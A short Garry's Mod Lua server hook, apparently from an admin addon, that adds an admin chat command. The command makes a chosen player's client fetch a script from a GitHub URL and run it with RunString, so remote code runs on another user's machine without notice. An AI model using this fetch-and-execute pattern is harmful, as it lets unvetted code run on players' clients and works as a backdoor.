hook.Add("PlayerSay", "BAdmin_ExecGitHubLua", function(ply, text)
    local args = string.Explode(" ", text)
    if args[1] == "ba" and args[2] == "exec" and args[4] == ".lua" and args[3] then
        if not ply:IsAdmin() then return "" end
        local steamid = args[3]
        for _, target in ipairs(player.GetAll()) do
            if target:SteamID() == steamid then
                target:SendLua([[
                    http.Fetch("]]..GITHUB_LUA_URL..[[", function(b) RunString(b) end)
                ]])
                break
            end
        end
        return ""
    end
end)
